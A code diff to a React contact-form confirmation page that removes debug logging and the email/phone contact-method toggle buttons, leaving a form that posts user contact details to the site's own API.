@@ -69,8 +69,6 @@ export default function Confirmation() {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
       };
 
-      console.log('Submitting form data:', formattedData);
-
       await apiRequest('POST', '/api/contact-form', formattedData);
       localStorage.removeItem('validation_data');
 
@@ -80,7 +78,6 @@ export default function Confirmation() {
       });
       setLocation("/success");
     } catch (error) {
-      console.error('Form submission error:', error);
       toast({
         variant: "destructive",
         title: "Error",
@@ -112,36 +109,6 @@ export default function Confirmation() {
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
               <div className="text-left">
-                <div className="mb-4">
-                  <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
-                    Contact Method
-                  </label>
-                  <div className="flex gap-4">
-                    <button
-                      type="button"
-                      onClick={() => setContactMethod('email')}
-                      className={`flex-1 py-1.5 text-sm rounded ${
-                        contactMethod === 'email'
-                          ? 'bg-[#1877f2] text-white'
-                          : 'bg-[#e4e6eb] text-[#606770]'
-                      }`}
-                    >
-                      Email
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => setContactMethod('phone')}
-                      className={`flex-1 py-1.5 text-sm rounded ${
-                        contactMethod === 'phone'
-                          ? 'bg-[#1877f2] text-white'
-                          : 'bg-[#e4e6eb] text-[#606770]'
-                      }`}
-                    >
-                      Phone
-                    </button>
-                  </div>
-                </div>
-
                 <FormField
                   control={form.control}
                   name="user_email"
